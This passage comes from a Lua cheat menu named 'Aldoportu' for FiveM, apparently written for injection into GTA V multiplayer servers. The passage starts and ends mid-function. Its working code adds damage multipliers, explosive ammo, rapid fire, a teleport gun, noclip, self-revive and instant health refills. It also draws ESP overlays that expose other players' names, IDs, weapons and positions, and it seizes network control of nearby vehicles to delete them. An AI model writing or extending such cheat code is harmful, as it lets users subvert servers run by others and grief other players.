		if tonumber(intToFloat(Aldoportu.storedControls.weaponsDamageMultiplierSet)) then
			SetPlayerWeaponDamageModifier(PlayerId(), tonumber(intToFloat(Aldoportu.storedControls.weaponsDamageMultiplierSet)))
			SetPlayerMeleeWeaponDamageModifier(PlayerId(), tonumber(intToFloat(Aldoportu.storedControls.weaponsDamageMultiplierSet)))
		end

		if Aldoportu.storedControls.weapExplosiveAmmo then
			local impact, coords = GetPedLastWeaponImpactCoord(Aldoportu.datastore.pLocalPlayer.pedId)
			if impact then
				Aldoportu.natives.addExplosion(coords.x, coords.y, coords.z, 2, 100.0, true, false, 0)
			end
			SetExplosiveMeleeThisFrame(PlayerId())
		end

		if Aldoportu.storedControls.weapCustomBullet then
			Aldoportu.functions.customBullet()
		end
		
		if Aldoportu.storedControls.weapTeleportGun then
			local impact, coords = GetPedLastWeaponImpactCoord(Aldoportu.datastore.pLocalPlayer.pedId)
			if impact then
				Aldoportu.functions.teleportSelf(coords.x, coords.y, coords.z + 3)
			end
		end

		if Aldoportu.storedControls.weapRapidFire then
			Aldoportu.functions.rapidFireTick()
		end

		--[[
			Keybinds
		]]

		if Aldoportu.keyBinds.currentKeybindMenu.handle and IsDisabledControlJustPressed(0, Keys[Aldoportu.keyBinds.currentKeybindMenu.handle]) then
			Aldoportu.openMenu('Aldoportu')
		end

		if Aldoportu.keyBinds.currentKeybindHealth.handle and IsDisabledControlJustPressed(0, Keys[Aldoportu.keyBinds.currentKeybindHealth.handle]) then
			Aldoportu.natives.setEntityHealth(PlayerPedId(-1), 200)
			Aldoportu.pushNotification('Health refilled', 5000)
		end

		if Aldoportu.keyBinds.currentKeybindArmour.handle and IsDisabledControlJustPressed(0, Keys[Aldoportu.keyBinds.currentKeybindArmour.handle]) then
			Aldoportu.natives.setPedArmour(PlayerPedId(-1), 200)
			Aldoportu.pushNotification('Armour refilled', 5000)
		end

		if Aldoportu.keyBinds.currentKeybindNoclip.handle and IsDisabledControlJustPressed(0, Keys[Aldoportu.keyBinds.currentKeybindNoclip.handle]) then
			Aldoportu.functions.toggleNoclip()
		end

		pWait(0)
	end
end)

--[[
	Run 2 step separately because of pWait usage
]]

pCreateThread(function()
	while Aldoportu.shouldShowMenu do
		if Aldoportu.storedControls.veh2Step then
        	Aldoportu.functions.vehicle2Step()
		end

		if Aldoportu.storedControls.vehDriftSmoke then
			RequestNamedPtfxAsset('scr_recartheft')
			while not HasNamedPtfxAssetLoaded('scr_recartheft') do
				pWait(1)
			end
			RequestNamedPtfxAsset('core')
			while not HasNamedPtfxAssetLoaded('core') do
				pWait(1)
			end
			ang,speed = Aldoportu.functions.game.vehicleAngle(GetVehiclePedIsUsing(GetPlayerPed(-1)))
			local _SIZE = 0.25
			local _DENS = 25
			local _BURNOUT_SIZE = 1.5
			if IsPedInAnyVehicle(GetPlayerPed(-1), false) then
                if speed >= 1.0 and ang ~= 0 then
                    Aldoportu.functions.game.driftSmoke('scr_recartheft', 'scr_wheel_burnout', GetVehiclePedIsUsing(GetPlayerPed(-1)), _DENS, _SIZE)
                elseif --[[speed < 1.0 and]] IsVehicleInBurnout(GetVehiclePedIsUsing(GetPlayerPed(-1))) then
                    Aldoportu.functions.game.driftSmoke('core', 'exp_grd_bzgas_smoke', GetVehiclePedIsUsing(GetPlayerPed(-1)), 3, _BURNOUT_SIZE)
                end
            end
		end

		if Aldoportu.storedControls.visForceGamertags then
			local plist = Aldoportu.natives.getActivePlayers()
			for i = 1, #plist do
				local id = plist[i]
				if GetPlayerPed(id) ~= GetPlayerPed(-1) then
					local ped = GetPlayerPed(id)
					--[[blip = GetBlipFromEntity( ped )]]

					local x1, y1, z1 = table.unpack( GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, true) )
					local x2, y2, z2 = table.unpack( GetEntityCoords(GetPlayerPed(id), true) )
					local distance = Aldoportu.trashFunctions.math_round(#(vector3(x1, y1, z1) - vector3(x2, y2, z2)), 1)

					if distance < 125 then
						if NetworkIsPlayerTalking(id) then
							Aldoportu.functions.drawText3DGamerTags(x2, y2, z2 + 1.25, '' .. GetPlayerServerId(id) .. ' | ' .. GetPlayerName(id) .. '', 30, 144, 255)
						else
							Aldoportu.functions.drawText3DGamerTags(x2, y2, z2 + 1.25, '' .. GetPlayerServerId(id) .. ' | ' .. GetPlayerName(id) .. '', 255, 255, 255)
						end
					end
				end
			end
		end

		Aldoportu.functions.playerBlips()

		pWait(0)
	end
end)

Aldoportu.functions.drawText3DGamerTags = function(x, y, z, text, r, g, b)
	SetDrawOrigin(x, y, z, 0)
	Aldoportu.natives.setTextFont(0)
	Aldoportu.natives.setTextProportional(0)
	Aldoportu.natives.setTextScale(0.0, 0.20)
	Aldoportu.natives.setTextColour(r, g, b, 255)
	SetTextDropshadow(0, 0, 0, 0, 255)
	SetTextEdge(2, 0, 0, 0, 150)
	Aldoportu.natives.setTextDropShadow()
	Aldoportu.natives.setTextOutline()
	Aldoportu.natives.beginTextCommandDisplayText('STRING')
	SetTextCentre(1)
	Aldoportu.natives.addTextComponentSubstringPlayerName(text)
	Aldoportu.natives.endTextCommandDisplayText(0.0, 0.0)
	ClearDrawOrigin()
end

--[[
	Functions here to keep menu clean
]]

--[[
	Math functions here instead of using frameworks from servers.
]]

Aldoportu.functions.Math = {}

Aldoportu.functions.Math.Round = function(value, numDecimalPlaces)
	if numDecimalPlaces then
		local power = 10^numDecimalPlaces
		return math.floor((value * power) + 0.5) / (power)
	else
		return math.floor(value + 0.5)
	end
end

Aldoportu.functions.Math.GroupDigits = function(value)
	local left,num,right = string.match(value,'^([^%d]*%d)(%d*)(.-)$')

	return left..(num:reverse():gsub('(%d%d%d)','%1' .. _U('locale_digit_grouping_symbol')):reverse())..right
end

Aldoportu.functions.Math.Trim = function(value)
	if value then
		return (string.gsub(value, '^%s*(.-)%s*$', '%1'))
	else
		return nil
	end
end

Aldoportu.functions.doesResourceExist = function(resource_name)
	if GetResourceState(resource_name) == 'started' or 
		string.upper(GetResourceState(resource_name)) == 'started' or 
		string.lower(GetResourceState(resource_name)) == 'started' or 
		GetResourceState(resource_name..'-master') == 'started' or 
		string.upper(GetResourceState(resource_name..'-master')) == 'started' or 
		string.lower(GetResourceState(resource_name..'-master')) == 'started' then
		return true
	else
		return false
	end
end

Aldoportu.functions.drawTextCrosshairs = function(C,x,y)
	Aldoportu.natives.setTextColour(Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b, 255)
	Aldoportu.natives.setTextFont(0)
	Aldoportu.natives.setTextProportional(1)
	Aldoportu.natives.setTextScale(0.0,0.4)
	SetTextDropshadow(1,0,0,0,255)
	SetTextEdge(1,0,0,0,255)
	Aldoportu.natives.setTextDropShadow()
	Aldoportu.natives.setTextOutline()
	Aldoportu.natives.beginTextCommandDisplayText('STRING')
	Aldoportu.natives.addTextComponentSubstringPlayerName(C)
	Aldoportu.natives.endTextCommandDisplayText(x,y)
end

Aldoportu.functions.teleportToWaypoint = function()
	pCreateThread(function() 
		local entity = Aldoportu.datastore.pLocalPlayer.pedId
		if IsPedInAnyVehicle(entity, false) then
			entity = GetVehiclePedIsUsing(entity)
		end
		local success = false
		local blipFound = false
		local blipIterator = GetBlipInfoIdIterator()
		local blip = GetFirstBlipInfoId(8)
		
		while DoesBlipExist(blip) do
			if GetBlipInfoIdType(blip) == 4 then
				cx, cy, cz = table.unpack(GetBlipInfoIdCoord(blip, Citizen.ReturnResultAnyway(), Citizen.ResultAsVector()))
				blipFound = true
				break
			end
			blip = GetNextBlipInfoId(blipIterator)
			pWait(0)
		end
		
		if blipFound then
			local groundFound = false
			local yaw = GetEntityHeading(entity)
			
			for i = 0, 1000, 1 do
				Aldoportu.natives.setEntityCoordsNoOffset(entity, cx, cy, ToFloat(i), false, false, false)
				SetEntityRotation(entity, 0, 0, 0, 0, 0)
				SetEntityHeading(entity, yaw)
				SetGameplayCamRelativeHeading(0)
				pWait(0)
				if GetGroundZFor_3dCoord(cx, cy, ToFloat(i), cz, false) then
					cz = ToFloat(i)
					groundFound = true
					break
				end
			end
			if not groundFound then
				cz = -300.0
			end
			success = true
		end
		
		if success then
			Aldoportu.natives.setEntityCoordsNoOffset(entity, cx, cy, cz, false, false, true)
			SetGameplayCamRelativeHeading(0)
			if IsPedSittingInAnyVehicle(Aldoportu.datastore.pLocalPlayer.pedId) then
				if GetPedInVehicleSeat(Aldoportu.datastore.pLocalPlayer.cVehicle, -1) == Aldoportu.datastore.pLocalPlayer.pedId then
					SetVehicleOnGroundProperly(Aldoportu.datastore.pLocalPlayer.cVehicle)
				end
			end
		end
	end)
end
Aldoportu.functions.teleportSelf = function(x, y, z)
	if IsPedInAnyVehicle(GetPlayerPed(-1), 0) and GetPedInVehicleSeat(GetVehiclePedIsIn(GetPlayerPed(-1), 0), -1) == GetPlayerPed(-1) then
		entity = GetVehiclePedIsIn(GetPlayerPed(-1), 0)
	else
		entity = GetPlayerPed(-1)
	end
	if entity then
		Aldoportu.natives.setEntityCoords(entity, x, y, z)
	end
end

Aldoportu.functions.runParticle = function()
	RequestNamedPtfxAsset('proj_xmas_firework')
	UseParticleFxAssetNextCall('proj_xmas_firework')
	StartNetworkedParticleFxNonLoopedOnEntity('scr_firework_xmas_burst_rgw', Aldoportu.datastore.pLocalPlayer.pedId, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
end

Aldoportu.functions.runInjectParticle = function()
	RequestNamedPtfxAsset('proj_xmas_firework')
	UseParticleFxAssetNextCall('proj_xmas_firework')
	StartNetworkedParticleFxNonLoopedOnEntity('scr_firework_xmas_burst_rgw', Aldoportu.datastore.pLocalPlayer.pedId, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
	StartNetworkedParticleFxNonLoopedOnEntity('scr_firework_xmas_spiral_burst_rgw', Aldoportu.datastore.pLocalPlayer.pedId, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
	StartNetworkedParticleFxNonLoopedOnEntity('scr_xmas_firework_sparkle_spawn', Aldoportu.datastore.pLocalPlayer.pedId, 0.0, 0.0, -0.5, 0.0, 0.0, 0.0, 1.0, false, false, false)
end
--[[Aldoportu.functions.runInjectParticle()]]

Aldoportu.functions.respawnPed = function(ped, coords, heading)
	Aldoportu.natives.setEntityCoordsNoOffset(ped, coords.x, coords.y, coords.z, false, false, false, true)
	NetworkResurrectLocalPlayer(coords.x, coords.y, coords.z, heading, true, false)
	SetPlayerInvincible(ped, false)
	Aldoportu.dTCE(false, false, 'playerSpawned', coords.x, coords.y, coords.z)
	ClearPedBloodDamage(ped)
end

Aldoportu.functions.nativeRevive = function()
	local coords = GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId)

	local formattedCoords = {
		x = Aldoportu.functions.Math.Round(coords.x, 1),
		y = Aldoportu.functions.Math.Round(coords.y, 1),
		z = Aldoportu.functions.Math.Round(coords.z, 1)
	}

	Aldoportu.functions.respawnPed(Aldoportu.datastore.pLocalPlayer.pedId, formattedCoords, 0.0)
	StopScreenEffect('DeathFailOut')
	Aldoportu.pushNotification('Revived', 5000)
end

Aldoportu.functions.repairVehicle = function(pvehicle)
	SetVehicleEngineHealth(pvehicle, 1000)
	SetVehicleFixed(pvehicle)
	SetVehicleEngineOn(pvehicle, 1, 1)
	SetVehicleBurnout(pvehicle, false)
end

Aldoportu.functions.deleteVehicle = function(pvehicle, radius)
	pCreateThread(function()
		if radius then
			local playerPed = Aldoportu.datastore.pLocalPlayer.pedId
			radius = tonumber(radius) + 0.01
			local vehicles = Aldoportu.functions.game.getVehiclesInArea(GetEntityCoords(playerPed), radius)

			for k,entity in ipairs(vehicles) do
				local attempt = 0

				if entity == Aldoportu.datastore.pLocalPlayer.cVehicle then entity = entity + 1 end

				while not NetworkHasControlOfEntity(entity) and attempt < 50 and DoesEntityExist(entity) do
					NetworkRequestControlOfEntity(entity)
					attempt = attempt + 1
				end

				if DoesEntityExist(entity) and NetworkHasControlOfEntity(entity) then
					SetEntityAsMissionEntity(entity, false, true)
					DeleteVehicle(entity)
				end
			end
		else
			SetEntityAsMissionEntity(pvehicle, false, true)
			DeleteVehicle(pvehicle)
		end
	end)
end

Aldoportu.functions.optimizeFPS = function()
	ClearAllBrokenGlass()
	ClearAllHelpMessages()
	LeaderboardsReadClearAll()
	ClearBrief()
	ClearGpsFlags()
	ClearPrints()
	ClearSmallPrints()
	ClearReplayStats()
	LeaderboardsClearCacheData()
	ClearFocus()
	ClearHdArea()
	ClearPedBloodDamage(Aldoportu.datastore.pLocalPlayer.pedId)
	ClearPedWetness(Aldoportu.datastore.pLocalPlayer.pedId)
	ClearPedEnvDirt(Aldoportu.datastore.pLocalPlayer.pedId)
	ResetPedVisibleDamage(Aldoportu.datastore.pLocalPlayer.pedId)
end

Aldoportu.functions.disappearFromChase = function()
	if IsPedInAnyVehicle(GetPlayerPed(-1)) then

		local vehicle = GetVehiclePedIsIn(Aldoportu.datastore.pLocalPlayer.pedId, true)
		if DoesEntityExist(vehicle) then
			local targetx, targety, targetz = table.unpack(GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId))
			if Aldoportu.storedControls.selectedDisappearFromChase == 1 then
				Aldoportu.natives.setEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, targetx + 1, targety + 2, targetz + 100)
			elseif Aldoportu.storedControls.selectedDisappearFromChase == 2 then
				Aldoportu.natives.setEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, 195.23, -934.04, 30.69)
			elseif Aldoportu.storedControls.selectedDisappearFromChase == 3 then
				Aldoportu.natives.setEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, -1653.85, -860.87, 9.16)
			elseif Aldoportu.storedControls.selectedDisappearFromChase == 4 then
				Aldoportu.natives.setEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, 2024.28, 3770.94, 32.18)
			elseif Aldoportu.storedControls.selectedDisappearFromChase == 5 then
				Aldoportu.natives.setEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, -183.57, 6366.65, 31.47)
			end
			
			--[[Aldoportu.natives.setEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, -1729.98, -724.68, 9.84)]]

			local newDriver = CreatePedInsideVehicle(vehicle, 4, GetEntityModel(Aldoportu.datastore.pLocalPlayer.pedId), -1, true, false)
			Aldoportu.functions.sPO.clonePedOutfit(newDriver, Aldoportu.datastore.pLocalPlayer.pedId)
			SetEntityAsMissionEntity(newDriver, 0, 0)
			TaskVehicleDriveToCoordLongrange(newDriver, vehicle, -34.552, -673.060, 31.944, 100.0, 537657916, 1.0)
			SetDriveTaskDrivingStyle(newDriver, 6)

			local vehicleModel = GetEntityModel(vehicle)
			local spawnedVehicle = Aldoportu.functions.sPO.SpawnVehicleToPlayer(vehicleModel, PlayerId())
			local vehicleProperties = Aldoportu.functions.game.getVehicleProperties(vehicle)
			vehicleProperties.plate = nil

			Aldoportu.functions.game.setVehicleProperties(spawnedVehicle, vehicleProperties)
		else
			Aldoportu.pushNotification('Error getting your car')
			dir_print('vehicle entity doesnt exist')
		end
	else
		Aldoportu.pushNotification('You\'re not in a vehicle')
	end
end

Aldoportu.functions.vehicle2Step = function()
	p_flame_location = {
		'exhaust',
		'exhaust_2',
		'exhaust_3',
		'exhaust_4',
		'exhaust_5',
		'exhaust_6',
		'exhaust_7',
		'exhaust_8',
		'exhaust_9',
		'exhaust_10',
		'exhaust_11',
		'exhaust_12',
		'exhaust_13',
		'exhaust_14',
		'exhaust_15',
		'exhaust_16'
	}
	p_flame_particle = 'veh_backfire'
	p_flame_particle_asset = 'core' 
	p_flame_size = 2.0

	if IsPedInAnyVehicle(GetPlayerPed(-1)) then
		local pedVehicle = GetVehiclePedIsIn(GetPlayerPed(-1))
		local pedPos = GetEntityCoords(GetPlayerPed(-1))
		local vehiclePos = GetEntityCoords(pedVehicle)
		local RPM = GetVehicleCurrentRpm(GetVehiclePedIsIn(GetPlayerPed(-1)))

		if GetPedInVehicleSeat(pedVehicle, -1) == GetPlayerPed(-1) then
			local BackFireDelay = (math.random(250, 750))
			local backFireSize = (math.random(2, 6) / 1.5)
			if RPM > 0.3 and RPM < 0.6 then
				for _,bones in pairs(p_flame_location) do
					if GetEntityBoneIndexByName(pedVehicle, bones) >= 0 then
						UseParticleFxAssetNextCall(p_flame_particle_asset)
						createdPart = StartParticleFxLoopedOnEntityBone(p_flame_particle, NetToVeh(VehToNet(pedVehicle)), 0.0, 0.0, 0.0, 0.0, 0.0, 0.0, GetEntityBoneIndexByName(NetToVeh(VehToNet(pedVehicle)), bones), backFireSize--[[p_flame_size]], 0.0, 0.0, 0.0)
						StopParticleFxLooped(createdPart, 1)
					end
				end
				--[[Aldoportu.natives.playSoundFrontend(-1, 'Jet_Explosions', 'exile_1', true)]]
				Aldoportu.natives.addExplosion(vehiclePos.x, vehiclePos.y, vehiclePos.z, 61, 0.0, true, true, 0.0, true)
				Aldoportu.datastore.pLocalPlayer.should2stepAutist = true
			  	pWait(BackFireDelay)
			else 
				Aldoportu.datastore.pLocalPlayer.should2stepAutist = false
			end
		end
	end
end

Aldoportu.functions.maxUpgrades = function(veh)
	SetVehicleModKit(veh, 0)
	SetVehicleCustomPrimaryColour(Aldoportu.datastore.pLocalPlayer.cVehicle, 0, 0, 0)
	SetVehicleCustomSecondaryColour(Aldoportu.datastore.pLocalPlayer.cVehicle, 0, 0, 0)
	SetVehicleColours(veh, 12, 12)
	SetVehicleModColor_1(veh, 3, false)
	SetVehicleExtraColours(veh, 3, false)
	ToggleVehicleMod(veh, 18, true)
	ToggleVehicleMod(veh, 22, true)
	SetVehicleMod(veh, 16, 5, false)
	SetVehicleMod(veh, 12, 2, false)
	SetVehicleMod(veh, 11, 3, false)
	SetVehicleMod(veh, 14, 14, false)
	SetVehicleMod(veh, 15, 3, false)
	SetVehicleMod(veh, 13, 2, false)
	SetVehicleWindowTint(veh, 5)
	SetVehicleWheelType(veh, false)
	SetVehicleMod(veh, 23, 21, true)
	SetVehicleMod(veh, 0, 1, false)
	SetVehicleMod(veh, 1, 1, false)
	SetVehicleMod(veh, 2, 1, false)
	SetVehicleMod(veh, 3, 1, false)
	SetVehicleMod(veh, 4, 1, false)
	SetVehicleMod(veh, 5, 1, false)
	SetVehicleMod(veh, 6, 1, false)
	SetVehicleMod(veh, 7, 1, false)
	SetVehicleMod(veh, 8, 1, false)
	SetVehicleMod(veh, 9, 1, false)
	SetVehicleMod(veh, 10, 1, false)
	IsVehicleNeonLightEnabled(veh, true)
	SetVehicleNeonLightEnabled(veh, 0, true)
	SetVehicleNeonLightEnabled(veh, 1, true)
	SetVehicleNeonLightEnabled(veh, 2, true)
	SetVehicleNeonLightEnabled(veh, 3, true)
	SetVehicleNeonLightEnabled(veh, 4, true)
	SetVehicleNeonLightEnabled(veh, 5, true)
	SetVehicleNeonLightEnabled(veh, 6, true)
	SetVehicleNeonLightEnabled(veh, 7, true)
	SetVehicleNeonLightsColour(veh, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b)
	SetVehicleModKit(veh, 0)
	ToggleVehicleMod(veh, 20, true)
	SetVehicleModKit(veh, 0)
	SetVehicleTyreSmokeColor(veh, Aldoportu.mainColor.r, Aldoportu.mainColor.g, Aldoportu.mainColor.b)
	SetVehicleNumberPlateTextIndex(veh, true)
	--[[Aldoportu.functions.runParticle()]]
end

Aldoportu.functions.maxPerformanceUpgrades = function(pVehicle)
	SetVehicleModKit(pVehicle, 0)
    SetVehicleMod(pVehicle, 11, GetNumVehicleMods(pVehicle, 11) - 1, false)
    SetVehicleMod(pVehicle, 12, GetNumVehicleMods(pVehicle, 12) - 1, false)
    SetVehicleMod(pVehicle, 13, GetNumVehicleMods(pVehicle, 13) - 1, false)
    SetVehicleMod(pVehicle, 15, GetNumVehicleMods(pVehicle, 15) - 2, false)
    SetVehicleMod(pVehicle, 16, GetNumVehicleMods(pVehicle, 16) - 1, false)
    ToggleVehicleMod(pVehicle, 17, true)
    ToggleVehicleMod(pVehicle, 18, true)
    ToggleVehicleMod(pVehicle, 19, true)
    ToggleVehicleMod(pVehicle, 21, true)
end

Aldoportu.functions.spawnVehicle = function(vehicle_model)
	local x, y, z = table.unpack(GetOffsetFromEntityInWorldCoords(PlayerPedId(-1), 0.0, 8.0, 0.5))
	local veh = vehicle_model
	if veh == nil then
		veh = 'elegy'
	end
	local vehiclehash = GetHashKey(veh)
	RequestModel(vehiclehash)
	pCreateThread(function()
		local timeout = 0
		while not HasModelLoaded(vehiclehash) do
			timeout = timeout + 100
			pWait(100)
			if timeout > 5000 then
				Aldoportu.pushNotification('Could not spawn this vehicle!', 5000)
				break
			end
		end
		local SpawnedCar = Aldoportu.natives.createVehicle(vehiclehash, x, y, z, GetEntityHeading(PlayerPedId(-1)) + 90, 1, 0)

		SetVehicleStrong(SpawnedCar, true)
		SetVehicleEngineOn(SpawnedCar, true, true, false)
		SetVehicleEngineCanDegrade(SpawnedCar, false)
		
		if Aldoportu.storedControls.vehSpawnUpgraded then
			Aldoportu.functions.maxUpgrades(SpawnedCar)
		end
		
		if Aldoportu.storedControls.vehSpawnInside then
			SetPedIntoVehicle(Aldoportu.datastore.pLocalPlayer.pedId, SpawnedCar, -1)
		end

		--[[Aldoportu.functions.runParticle()]]
	end)
end

Aldoportu.functions.spawnCustomVehicle = function(data)
	pCreateThread(function()
		local timeout = 0
		if data.hash == nil then data.hash = 'elegy' end
		if not data.coords then data.coords = GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId) end
		RequestModel(data.hash)
		while not HasModelLoaded(data.hash) do
			timeout = timeout + 100
			pWait(100)
			if timeout > 5000 then
				Aldoportu.functions.sendNotification('Could not spawn this vehicle!')
				break
			end
		end

		local spawnedCar = Aldoportu.natives.createVehicle(data.hash, data.coords, GetEntityHeading(Aldoportu.datastore.pLocalPlayer.pedId), true, true)

		SetVehicleStrong(spawnedCar, true)
		SetVehicleEngineOn(spawnedCar, true, true, false)
		SetVehicleEngineCanDegrade(spawnedCar, false)

		if not Aldoportu.functions.game.isNullOrEmpty(data.plate) then 
			SetVehicleNumberPlateText(spawnedCar, data.plate) 
		end

		if Aldoportu.storedControls.vehSpawnUpgraded then
			Aldoportu.functions.maxUpgrades(spawnedCar)
		end

		if data.setIn then
			SetPedIntoVehicle(Aldoportu.datastore.pLocalPlayer.pedId, spawnedCar, -1)
		end
		
		if data.props then
			Aldoportu.functions.game.setVehicleProperties(spawnedCar, data.props)
		end
	end)
end

Aldoportu.functions.customBullet = function()
	function rotDirection(rot)
		local radianz = rot.z * 0.0174532924
		local radianx = rot.x * 0.0174532924
		local num = math.abs(math.cos(radianx))
	
		local dir = vector3(-math.sin(radianz) * num, math.cos(radianz) * num, math.sin(radianx))
	
		return dir
	end
	pCreateThread(function()
		local startDistance = Aldoportu.trashFunctions.getDistance(GetGameplayCamCoord(), GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, true))
		local endDistance = Aldoportu.trashFunctions.getDistance(GetGameplayCamCoord(), GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, true))
		startDistance = startDistance + 0.25
		endDistance = endDistance + 1000.0

		if IsPedShooting(Aldoportu.datastore.pLocalPlayer.pedId) then
			local bullet = GetHashKey(Aldoportu.menuTables.weaponsCustomBullet.actual)
			if not HasWeaponAssetLoaded(bullet) then
				RequestWeaponAsset(bullet, 31, false)
				while not HasWeaponAssetLoaded(bullet) do
					pWait(0)
				end
			end
			
			Aldoportu.natives.shootSingleBulletBetweenCoords(Aldoportu.trashFunctions.addVector(GetGameplayCamCoord(), Aldoportu.trashFunctions.multiplyVector(rotDirection(GetGameplayCamRot(0)), startDistance)).x, 
			Aldoportu.trashFunctions.addVector(GetGameplayCamCoord(), Aldoportu.trashFunctions.multiplyVector(rotDirection(GetGameplayCamRot(0)), startDistance)).y, Aldoportu.trashFunctions.addVector(GetGameplayCamCoord(), 
			Aldoportu.trashFunctions.multiplyVector(rotDirection(GetGameplayCamRot(0)), startDistance)).z, Aldoportu.trashFunctions.addVector(GetGameplayCamCoord(), Aldoportu.trashFunctions.multiplyVector(rotDirection(GetGameplayCamRot(0)), endDistance)).x, 
			Aldoportu.trashFunctions.addVector(GetGameplayCamCoord(), Aldoportu.trashFunctions.multiplyVector(rotDirection(GetGameplayCamRot(0)), endDistance)).y, Aldoportu.trashFunctions.addVector(GetGameplayCamCoord(), 
			Aldoportu.trashFunctions.multiplyVector(rotDirection(GetGameplayCamRot(0)), endDistance)).z, 250, true, bullet, Aldoportu.datastore.pLocalPlayer.pedId, true, false, -1.0)
		end
	end)
end

Aldoportu.functions.rapidFireTick = function()
	if Aldoportu.natives.isDisabledControlPressed(0, Keys['MOUSE1']) then
		local _, weapon = GetCurrentPedWeapon(Aldoportu.datastore.pLocalPlayer.pedId)
		local launchPos = GetEntityCoords(GetCurrentPedWeaponEntityIndex(Aldoportu.datastore.pLocalPlayer.pedId))
		local targetPos = GetGameplayCamCoord() + (GetCamDirFromScreenCenter() * 200.0)

		ClearAreaOfProjectiles(launchPos, 0.0, 1)
		
		Aldoportu.natives.shootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, weapon, Aldoportu.datastore.pLocalPlayer.pedId, true, true, 24000.0)

		if Aldoportu.storedControls.weapExplosiveAmmo then
			Aldoportu.natives.shootSingleBulletBetweenCoords(launchPos, targetPos, 5, 1, 'WEAPON_GRENADE', Aldoportu.datastore.pLocalPlayer.pedId, true, true, 24000.0)
		end
	end
end

Aldoportu.functions.toggleESP = function()
	local _,x,y = false, 0.0, 0.0

	pCreateThread(function()
		while Aldoportu.storedControls.visESPEnable and Aldoportu.shouldShowMenu do
			local plist = Aldoportu.natives.getActivePlayers()
			Aldoportu.trashFunctions.table_removekey(plist, PlayerId())
			for i = 1, #plist do
				local targetCoords = GetEntityCoords(GetPlayerPed(plist[i]))
				_, x, y = GetScreenCoordFromWorldCoord(targetCoords.x, targetCoords.y, targetCoords.z)
				local distance = GetDistanceBetweenCoords(GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId), targetCoords)
				if distance <= Aldoportu.storedControls.visualsESPDistance then
					local _we, wephash = GetCurrentPedWeapon(GetPlayerPed(plist[i]), 1)
                    local wepname = Aldoportu.trashFunctions.weaponNameFromHash(wephash)
                    local vehname = 'On Foot'
                    if IsPedInAnyVehicle(GetPlayerPed(plist[i]), 0) then
                        vehname = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(GetVehiclePedIsUsing(GetPlayerPed(plist[i])))))
                    end
					if wepname == nil then wepname = 'Unknown' end
					
                    local espstring1 = ''
					local espstring2 = ''
					if Aldoportu.storedControls.visESPShowID then
						espstring1 = espstring1..'~s~ | ~w~ID: ~s~' .. GetPlayerServerId(plist[i])
					end
					if Aldoportu.storedControls.visESPShowName then
						espstring1 = espstring1..'~s~ | ~w~Name: ~s~' .. GetPlayerName(plist[i])
					end
					if Aldoportu.storedControls.visESPShowDistance then
						espstring1 = espstring1..'~s~ | ~w~Distance: ~s~' .. math.floor(distance)..'~s~ |'
					end
					if Aldoportu.storedControls.visESPShowWeapon then
						espstring2 = espstring2..'~s~ | ~w~Weapon: ~s~' .. wepname
					end
					if Aldoportu.storedControls.visESPShowVehicle then
						espstring2 = espstring2..'~s~ | ~w~Vehicle: ~s~' .. vehname
					end
                    Aldoportu.DrawTxt(espstring1, x - 0.04, y - 0.04, 0.0, 0.3, Aldoportu.mainColor)
                    Aldoportu.DrawTxt(espstring2, x - 0.04, y - 0.03, 0.0, 0.3, Aldoportu.mainColor)
				end
			end
			pWait(Aldoportu.storedControls.visualsESPRefreshRate)
		end
	end)
end

Aldoportu.functions.toggleNoclip = function()
	Aldoportu.storedControls.noClip = not Aldoportu.storedControls.noClip
    if not Aldoportu.storedControls.noClip then
        SetEntityRotation(Aldoportu.datastore.pLocalPlayer.cVehicle, GetGameplayCamRot(2), 2, 1)
    end
end

Aldoportu.functions.getCamDirection = function()
    local heading = GetGameplayCamRelativeHeading() + GetEntityHeading(Aldoportu.datastore.pLocalPlayer.pedId)
    local pitch = GetGameplayCamRelativePitch()
    
    local x = -math.sin(heading * math.pi / 180.0)
    local y = math.cos(heading * math.pi / 180.0)
    local z = math.sin(pitch * math.pi / 180.0)
    
    local len = math.sqrt(x * x + y * y + z * z)
    if len ~= 0 then
        x = x / len
        y = y / len
        z = z / len
    end
    
    return x, y, z
end

Aldoportu.functions.getSeatPedIsIn = function(ped)
	if not IsPedInAnyVehicle(ped, false) then 
		return
	else
		veh = GetVehiclePedIsIn(ped)
		for i = 0, GetVehicleMaxNumberOfPassengers(veh) do
			if GetPedInVehicleSeat(veh) then return i end
		end
	end
end

Aldoportu.functions.noclipAdv = function()
	local noclipSpeed = 5
	local oldnoclipSpeed = 5

	local isInVehicle = IsPedInAnyVehicle(Aldoportu.datastore.pLocalPlayer.pedId, 0)
	local k = nil
	local x, y, z = nil
	
	if not isInVehicle then
		k = Aldoportu.datastore.pLocalPlayer.pedId
		x, y, z = table.unpack(GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, 2))
	else
		k = Aldoportu.datastore.pLocalPlayer.cVehicle
		x, y, z = table.unpack(GetEntityCoords(Aldoportu.datastore.pLocalPlayer.pedId, 1))
	end
	
	if isInVehicle and Aldoportu.functions.getSeatPedIsIn(Aldoportu.datastore.pLocalPlayer.pedId) ~= -1 then Aldoportu.trashFunctions.reqControlOnce(k) end
	
	local dx, dy, dz = Aldoportu.functions.getCamDirection()
	--[[Aldoportu.natives.setEntityVisible(Aldoportu.datastore.pLocalPlayer.pedId, 0, 0)
	Aldoportu.natives.setEntityVisible(k, 0, 0)]]
	
